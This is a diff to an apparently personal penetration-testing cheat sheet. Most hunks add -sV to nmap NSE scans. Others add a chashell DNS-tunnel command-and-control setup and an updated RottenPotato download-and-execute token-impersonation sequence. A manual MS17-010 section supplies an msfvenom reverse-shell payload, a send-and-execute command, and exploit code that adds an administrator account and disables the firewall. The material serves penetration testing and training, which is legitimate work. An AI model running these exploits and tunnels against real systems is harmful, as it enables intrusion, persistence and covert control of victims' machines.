@@ -131,6 +131,59 @@ user@remote:$ export TERM=xterm
 
 
 
+## Transport over DNS
+
+* [https://xakep.ru/2018/09/07/dns-tunneling/](https://xakep.ru/2018/09/07/dns-tunneling/)
+
+
+
+### chashell
+
+* [https://github.com/sysdream/chashell](https://github.com/sysdream/chashell)
+
+Get dependencies:
+
+```
+$ export GOPATH=/home/snovvcrash/code/go
+$ export PATH=$GOPATH:$GOPATH/bin:$PATH
+$ go get -v -u github.com/golang/dep/cmd/dep
+$ go get github.com/mitchellh/gox
+$ cd $GOPATH/src/github.com/golang/dep
+$ go install ./...
+```
+
+Clone chashell into `$GOPATH/src` (otherwise, `dep` will error out):
+
+```
+$ git clone https://github.com/sysdream/chashell $GOPATH/src/chashell
+$ cd $GOPATH/src/chashell
+```
+
+Build binaries:
+
+```
+$ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
+$ export DOMAIN_NAME=c.igsbmmyvulmr.ru
+$ make build-all OSARCH="linux/amd64"
+```
+
+Run server:
+
+```
+$ cd release/
+$ sudo systemctl stop systemd-resolved
+$ sudo ./chaserv_linux_amd64
+```
+
+Run client:
+
+```
+./chashell_linux_amd64
+```
+
+
+
+
 
 # File Transfer
 
@@ -418,7 +471,7 @@ $ sudo nmap -sV --script=rpcinfo 10.10.10.0/24 -p111
 Run Nmap scripts:
 
 ```
-$ sudo nmap --script='nfs*' 10.10.10.0/24 -p111
+$ sudo nmap -sV --script='nfs*' 10.10.10.0/24 -p111
 ```
 
 
@@ -604,9 +657,9 @@ Enumerate all AD Computers:
 ## Nmap NSE
 
 ```
-$ nmap -n -Pn --script=ldap-rootdse 127.0.0.1 -p389
-$ nmap -n -Pn --script=ldap-search 127.0.0.1 -p389
-$ nmap -n -Pn --script=ldap-brute 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script=ldap-rootdse 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script=ldap-search 127.0.0.1 -p389
+$ nmap -n -Pn -sV --script=ldap-brute 127.0.0.1 -p389
 ```
 
 
@@ -1678,10 +1731,10 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 * [https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
 
 ```
-$ curl -L https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe > r.exe
+$ curl -L https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe > r.exe
 meterpreter > upload r.exe
 meterpreter > load incognito
-meterpreter > execute -cH -f rottenpotato.exe
+meterpreter > execute -cH -f r.exe
 meterpreter > list_tokens -u
 meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 ```
@@ -1694,8 +1747,9 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 
 #### ohpe/juicy-potato
 
-* [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
-* [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
+* [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)
+* [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
+* [https://ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
 
 ```
 $ curl -L https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe > j.exe
@@ -2751,7 +2805,7 @@ Check:
 ```
 $ host facebook.com ns.example.com
 $ dig +short @ns.example.com test.openresolver.com TXT
-$ nmap -sU -p53 --script=dns-recursion ns.example.com
+$ nmap -sU -sV --script=dns-recursion ns.example.com -p53
 ```
 
 
@@ -4411,8 +4465,8 @@ $ nmap -A ... == nmap -sC -sV -O --traceroute ...
 Enum WAF:
 
 ```
-$ nmap --script http-waf-detect 127.0.0.1 -p80
-$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
+$ nmap -sV --script http-waf-detect 127.0.0.1 -p80
+$ nmap -sV --script http-waf-fingerprint 127.0.0.1 -p80
 + wafw00f.py
 ```
 
@@ -4505,13 +4559,9 @@ msf > use auxiliary/scanner/netbios/nbname
 Check for SMB vulnerablities with NSE:
 
 ```
-$ sudo nmap --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
-$ sudo nmap -n -Pn --script='smb-vuln*' 10.10.13.37 -p445
+$ sudo nmap -sV --script-args=unsafe=1 --script=smb-os-discovery 10.10.13.37 -p139,445
+$ sudo nmap -n -Pn -sV --script='smb-vuln*' 10.10.13.37 -p445
 ```
-
-Exploit MS08-067 and MS17-010 without MSF:
-
-* [https://0xdf.gitlab.io/2019/02/21/htb-legacy.html](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)
 
 
 
@@ -4523,8 +4573,8 @@ Exploit MS08-067 and MS17-010 without MSF:
 #### Check
 
 ```
-$ sudo nmap -n -Pn --script=smb-vuln-ms08-067 10.10.13.37 -p445
-
+$ sudo nmap -n -Pn -sV --script=smb-vuln-ms08-067 10.10.13.37 -p445
+Or
 msf > use exploit/windows/smb/ms08_067_netapi
 msf > check
 ```
@@ -4547,8 +4597,8 @@ msf > exploit
 #### Check
 
 ```
-$ sudo nmap -n -Pn --script=smb-vuln-ms17-010 10.10.13.37 -p445
-
+$ sudo nmap -n -Pn -sV --script=smb-vuln-ms17-010 10.10.13.37 -p445
+Or
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
@@ -4557,6 +4607,28 @@ msf > use auxiliary/scanner/smb/smb_ms17_010
 
 ```
 msf > exploit/windows/smb/ms17_010_eternalblue
+```
+
+##### Manually
+
+* [https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)
+* [https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)
+
+Send MSF payload and execute it with `send_and_execute.py`:
+
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
+$ python send_and_execute.py 10.10.13.38 rev.exe
+```
+
+Or just execute some commands on the host with `zzz_exploit.py`:
+
+```python
+def smb_pwn(conn, arch):
+	...
+	service_exec(conn, r'cmd /c net user snovvcrash Passw0rd! /add')
+	service_exec(conn, r'cmd /c net localgroup administrators snovvcrash /add')
+	service_exec(conn, r'cmd /c netsh firewall set opmode disable')
 ```
 
 
@@ -5352,7 +5424,7 @@ Notes:
 #### Nmap
 
 ```
-$ sudo nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.megacorp.com
+$ sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.megacorp.com
 ```
 
 
